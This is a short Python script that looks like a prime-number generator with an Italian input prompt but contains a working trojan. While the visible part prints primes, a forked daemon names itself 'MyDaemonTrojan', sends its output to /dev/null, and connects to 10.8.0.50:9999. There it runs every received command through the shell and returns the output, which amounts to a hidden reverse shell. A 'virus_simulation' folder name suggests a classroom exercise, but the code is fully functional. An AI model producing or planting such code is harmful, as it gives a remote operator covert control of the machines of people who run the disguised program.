#!/usr/bin/env python3
import os, sys, time
from setproctitle import setproctitle
import socket
import subprocess
import threading


def sieve_of_eratosthenes(limit):
    """Generate all prime numbers up to a given limit using the Sieve of Eratosthenes algorithm."""
    primes = [True] * (limit + 1)
    p = 2
    while p * p <= limit:
        if primes[p]:
            for i in range(p * p, limit + 1, p):
                primes[i] = False
        p += 1
    return [p for p in range(2, limit + 1) if primes[p]]

def read_integer(prompt):
    """Read an integer from input and check for errors."""
    while True:
        try:
            return int(input(prompt)) % 100000
        except ValueError:
            print("Invalid input. Please enter a valid integer.")

def print_first_n_primes(n):
    """Print the first n prime numbers."""
    limit = 100  # Initial limit to find primes
    primes = sieve_of_eratosthenes(limit)
    while len(primes) < n:
        limit *= 2
        primes = sieve_of_eratosthenes(limit)
    for prime in primes[:n]:
        print(prime, end=', ')
    print()

def daemonize():
    """Detach process and run as daemon."""
    try:
        pid = os.fork()
        if pid > 0:
            n = read_integer("Inserire quanti numeri primi vuoi generare: ")
            print_first_n_primes(int(n))
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("Fork #1 failed: {}\n".format(e))
        sys.exit(1)
    os.chdir("/")
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("Fork #2 failed: {}\n".format(e))
        sys.exit(1)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as read_null:
        os.dup2(read_null.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as write_null:
        os.dup2(write_null.fileno(), sys.stdout.fileno())
        os.dup2(write_null.fileno(), sys.stderr.fileno())

def tcp_client(host, port, home_directory):
    """Simple TCP client that connects to a server, waits for commands, and executes them."""
    os.chdir(home_directory)
    count=1
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                print(f"Connected to {host}:{port}")
                while True:
                    s.sendall(f"\n\n{count}) Command: ".encode('utf-8'))
                    count += 1
                    data = s.recv(1024)
                    if not data:
                        break
                    command = data.decode('utf-8')
                    print(f"Received command: {command}")
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    s.sendall(output)
        except ConnectionRefusedError:
            print(f"Connection to {host}:{port} refused. Retrying in 5 seconds.")
            time.sleep(5)
        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Change the process title for identification in the process list
    setproctitle("MyDaemonTrojan")

    # takes folder names
    script = sys.argv[0]
    script = os.path.abspath(script)
    current_folder = os.path.dirname(script)
    print(f"Current folder: {current_folder}")
    print(f"Script: {script}")
    target_dir = current_folder+"/virus_simulation"
    print(f"Target directory: {target_dir}")

    # Daemonize the process so it runs in the background
    print("Daemonizing process")
    daemonize()

    #Scan home folder
    home_directory = os.path.expanduser("~")

    # Run tcpclient in a separate thread
    tcp_client_thread = threading.Thread(target=tcp_client, args=('10.8.0.50', 9999, home_directory))
    tcp_client_thread.start()
    tcp_client_thread.join()

